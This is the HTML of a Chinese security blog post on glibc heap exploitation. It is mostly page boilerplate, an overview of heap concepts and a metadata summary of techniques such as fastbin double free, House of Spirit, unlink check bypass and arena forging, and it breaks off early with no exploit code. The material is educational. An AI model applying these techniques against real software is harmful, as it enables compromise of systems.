<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>Glibc Heap Exp | 米惜</title><meta name="keywords" content="漏洞分析,pwn,Linux"><meta name="author" content="Ivoripuion,carsge@tencent.com"><meta name="copyright" content="Ivoripuion"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="Glibc Heap Exp"><meta name="application-name" content="Glibc Heap Exp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="Glibc Heap Exp"><meta property="og:url" content="http://example.com/2023/10/16/glibcHeapExp/index.html"><meta property="og:site_name" content="米惜"><meta property="og:description" content="Glibc Heap ExpGlibc Heap OverviewGLibc Heap 负责维护动态分配memory的结构称为Heap Libc里比较常用的部分是malloc，free，realloc C++的new，delete，底层是上述几个   配置新的内存块，释放掉并回收不需要的部分，在配置"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="http://example.com/img/default_cover.jpg"><meta property="article:author" content="Ivoripuion"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/img/default_cover.jpg"><meta name="description" content="Glibc Heap ExpGlibc Heap OverviewGLibc Heap 负责维护动态分配memory的结构称为Heap Libc里比较常用的部分是malloc，free，realloc C++的new，delete，底层是上述几个   配置新的内存块，释放掉并回收不需要的部分，在配置"><link rel="shortcut icon" href="/img/me.jpg"><link rel="canonical" href="http://example.com/2023/10/16/glibcHeapExp/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?855d9db99474dd0e98e385c4b629eeee";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"(❁´◡`❁)","backTitle":"(●'◡'●)"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Ivoripuion","link":"链接: ","source":"来源: 米惜","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '米惜',
  title: 'Glibc Heap Exp',
  postAI: '',
  pageFillDescription: 'Glibc Heap Exp, Glibc Heap Overview, GLibc Heap, Heap相关的漏洞利用, Glibc Heap相关概念, 编译glibc2.23时的一个问题, 使用docker时的一个问题, Chunk, Chunk Header标志位, Size(64 bit), Heap操作, free 的例子, ExploitUAF, 利用chunk的回收特性, Fastbin Corruption, fastbin, fastbin corruption, Fastbin Sanity Check, fastbin double free, Overflow Freed chunk, Free Arbitrary Address(House of Spirit), Unlink Exploitation, 合并 freed chunks, unlink() Macro, 利用, Overwrite Heap Pointer, mmap chunks, 伪造arena负责维护动态分配的结构称为里比较常用的部分是的底层是上述几个配置新的内存块释放掉并回收不需要的部分在配置内存的时候尽量避免碎片化相关的漏洞利用相关概念要做到内存的管理有哪些位置的内存可以分配有哪些位置因为可以回收有哪些位置使用中则不需要记录使用它们的人应该记住这些指标整个的信息记录在一个的中称为分配的内存称为比要求的大小大一些因为需要记录一些维护用的额外信息和分配的内存分开存放无法直接覆盖掉它的部分回收的用记录称为中有很多的每个储存的不同目的是让时可以找到最适合大小的回收的会根据来决定应该存放在哪个中时先从里面找可以使用的如果找不到才会真的分配新的内存给程序使用分配时可以去找到足够大的只切出需要的部分剩下的部分会形成新的找不到可以用的时会从里分配是一个很大的代表可使用但是未分配的内存分配时从里面切一块下来剩下的重新设置为编译时的一个问题使用时的一个问题为了契合版本使用创建了一个的容器在修改地址随机化时提示权限不够其实就是创建时需要特权进入存放的结构加是为了给前一个的使用实际的位置是得到的地址是后向上对齐得到的标志位该在内存中的大小不是指向里的前一个后一个一般来说就是前一个维护时可以得知前一个位置标志位包含以及为把标志位最低最低的为用来表示前一个是否使用会使下一个的被设置为操作找出一个可用的或从切下一块来如果这个是回收的要先从里面即移除填好结构并回传检查该内存地址的前后是不是如果有则这些回收的内存可以合并合并后的新放到对应的中的例子完毕完毕完毕和等内部操作没有关系让程序的两个指标指向同一个内存一个是另一个用作利用对的读写修改或者泄露的内容利用的回收特性所谓就是掉后还继续使用它例如掉后忘了把它指向的内容置为导致内容还留存在中重新一样的大小会拿到曾经掉的此时就存在两个指针指向同一片内存使用这两个指针的操作会混在一起如其中一个是的对象有个指针用来找出实际的如果另一个是可以写入的就可以改掉代码执行完内容为后堆的内部变化堆此时将当作虚表指针指向了然后再追一次调用的会被放在一系列称为的里是是一开始是是只使用以做结尾从开始共个可以用的时不取消下一个的标志位因为不会和其它合并操作时会做一些检查确认是否正确避免一些可能的攻击方式为了效率里的检查会比其他类型的少很多让指向任意地址之后就是将该地址作为拿出来才会存在里修改它的才会造成从里取出要从正确的里拿出来即要正确时要对时会检查里第一个是不是跟这个要的相同只检查里的第一个只要不是连续同一个就行形成了一个造成类似的效果可以改掉还在里的的标志位是由连起来的改掉可以让接往任意地址多次后就可以拿到一个地址可以控制的取出的的的标志位要正确所以不是完全任意地址要能构造假的用上的变量作可以一个上的地址上用地址最常见的作取得后有机会对该地址任意读写如果有可以覆盖下一个的指标先掉下一个再进行时要注意下一个的是否正确测试程序覆盖地址方法这里可能是版本的缘故并没有在表上下文中找到作为的所以做到填充的前一步之后覆盖为然后即可其他可以改掉一个原本由得到的指针时会被改掉的指针进入下次是就可以拿到合并非在掉时会跟前后的合并是用来把移出用的从移除利用如果有可以覆盖到某个的时可以控制的使得的内容也可控利用机制造成现在已经不可用现在会进行检查实际的会检查是不是合法的检查绕过需要以下一些条件一个指向内的指针存放该指针的地址已知可以对该指针写入多次超过约时会改用直接请求内存得到的地址是连续的得到的会接在上一次之前通常最后一次会是段伪造平常使用的是在内部的参数时会根据段上的某些指标决定使用的时可以盖掉指标段上有伪造的的部分使得下次时可以取得伪造的这个利用方式需要任意大小的但是不需要练习题',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-21 22:09:19',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="/img/avater.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://ivoripuion.github.io/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://github.com/Ivoripuion" title="米惜的github"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/me.jpg" alt="米惜的github"/><span class="back-menu-item-text">米惜的github</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">米惜</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/BAS/" style="font-size: 1.05rem;">BAS<sup>1</sup></a><a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Java安全<sup>2</sup></a><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>5</sup></a><a href="/tags/Windows/" style="font-size: 1.05rem;">Windows<sup>9</sup></a><a href="/tags/blackhat2023-png/" style="font-size: 1.05rem;">blackhat2023.png<sup>1</sup></a><a href="/tags/fuzz/" style="font-size: 1.05rem;">fuzz<sup>6</sup></a><a href="/tags/pwn/" style="font-size: 1.05rem;">pwn<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>1</sup></a><a href="/tags/%E4%B8%B4%E5%BA%8A/" style="font-size: 1.05rem;">临床<sup>2</sup></a><a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">二进制安全<sup>2</sup></a><a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">云安全<sup>4</sup></a><a href="/tags/%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F/" style="font-size: 1.05rem;">信息隐藏<sup>1</sup></a><a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" style="font-size: 1.05rem;">内存马<sup>1</sup></a><a href="/tags/%E5%88%91%E6%B3%95/" style="font-size: 1.05rem;">刑法<sup>1</sup></a><a href="/tags/%E5%89%A7%E6%9C%AC%E6%9D%80%E8%A7%A3%E6%9E%90/" style="font-size: 1.05rem;">剧本杀解析<sup>2</sup></a><a href="/tags/%E5%AD%98%E5%9C%A8%E4%B8%BB%E4%B9%89/" style="font-size: 1.05rem;">存在主义<sup>3</sup></a><a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 1.05rem;">实战<sup>3</sup></a><a href="/tags/%E5%AE%9E%E8%B7%B5/" style="font-size: 1.05rem;">实践<sup>5</sup></a><a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 1.05rem;">开发<sup>1</sup></a><a href="/tags/%E6%96%87%E5%AD%A6%E9%89%B4%E8%B5%8F/" style="font-size: 1.05rem;">文学鉴赏<sup>1</sup></a><a href="/tags/%E6%97%A5%E8%AF%AD/" style="font-size: 1.05rem;">日语<sup>1</sup></a><a href="/tags/%E6%B3%95%E5%AD%A6/" style="font-size: 1.05rem;">法学<sup>1</sup></a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 1.05rem;">漏洞分析<sup>22</sup></a><a href="/tags/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B/" style="font-size: 1.05rem;">病毒检测<sup>2</sup></a><a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 1.05rem;">笔记<sup>54</sup></a><a href="/tags/%E7%B2%BE%E7%A5%9E%E5%88%86%E6%9E%90/" style="font-size: 1.05rem;">精神分析<sup>10</sup></a><a href="/tags/%E8%85%BE%E8%AE%AF%E4%BA%91%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">腾讯云主机安全<sup>1</sup></a><a href="/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/" style="font-size: 1.05rem;">论文阅读<sup>1</sup></a><a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 1.05rem;">逆向<sup>12</sup></a><a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 1.05rem;">随笔<sup>3</sup></a><a href="/tags/%E9%9D%9E%E9%81%93%E5%BE%B7%E4%B8%BB%E4%B9%89/" style="font-size: 1.05rem;">非道德主义<sup>1</sup></a><a href="/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/" style="font-size: 1.05rem;">面试题<sup>1</sup></a><a href="/tags/%E9%A9%AC%E5%85%8B%E6%80%9D%E4%B8%BB%E4%B9%89/" style="font-size: 1.05rem;">马克思主义<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">56</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/11/"><span class="card-archive-list-date">十一月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/" itemprop="url">pwn</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>漏洞分析</span></a><a class="article-meta__tags" href="/tags/pwn/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>pwn</span></a><a class="article-meta__tags" href="/tags/Linux/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>Linux</span></a></span></div></div><h1 class="post-title" itemprop="name headline">Glibc Heap Exp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-10-16T15:29:03.846Z" title="发表于 2023-10-16 23:29:03">2023-10-16</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-10-21T14:09:19.531Z" title="更新于 2023-10-21 22:09:19">2023-10-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">3.3k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>15分钟</span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为中国"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>中国</span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2023/10/16/glibcHeapExp/"><header><a class="post-meta-categories" href="/categories/pwn/" itemprop="url">pwn</a><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" tabindex="-1" itemprop="url">漏洞分析</a><a href="/tags/pwn/" tabindex="-1" itemprop="url">pwn</a><a href="/tags/Linux/" tabindex="-1" itemprop="url">Linux</a><h1 id="CrawlerTitle" itemprop="name headline">Glibc Heap Exp</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Ivoripuion</span><time itemprop="dateCreated datePublished" datetime="2023-10-16T15:29:03.846Z" title="发表于 2023-10-16 23:29:03">2023-10-16</time><time itemprop="dateCreated datePublished" datetime="2023-10-21T14:09:19.531Z" title="更新于 2023-10-21 22:09:19">2023-10-21</time></header><h1 id="Glibc-Heap-Exp"><a href="#Glibc-Heap-Exp" class="headerlink" title="Glibc Heap Exp"></a>Glibc Heap Exp</h1><h2 id="Glibc-Heap-Overview"><a href="#Glibc-Heap-Overview" class="headerlink" title="Glibc Heap Overview"></a>Glibc Heap Overview</h2><h3 id="GLibc-Heap"><a href="#GLibc-Heap" class="headerlink" title="GLibc Heap"></a>GLibc Heap</h3><ul>
<li>负责维护动态分配memory的结构称为Heap</li>
<li>Libc里比较常用的部分是malloc，free，realloc<ul>
<li>C++的new，delete，底层是上述几个</li>
</ul>
</li>
<li>配置新的内存块，释放掉并回收不需要的部分，在配置内存的时候尽量避免[碎片化]<span id="more"></span></li>
</ul>
<h3 id="Heap相关的漏洞利用"><a href="#Heap相关的漏洞利用" class="headerlink" title="Heap相关的漏洞利用"></a>Heap相关的漏洞利用</h3><ul>
<li>UAF</li>
<li>Double free</li>
<li>Heap overflow</li>
</ul>
<h3 id="Glibc-Heap相关概念"><a href="#Glibc-Heap相关概念" class="headerlink" title="Glibc Heap相关概念"></a>Glibc Heap相关概念</h3><ul>
<li><p>glibc&#x2F;malloc&#x2F;malloc.c</p>
</li>
<li><p>要做到内存的管理：</p>
<ul>
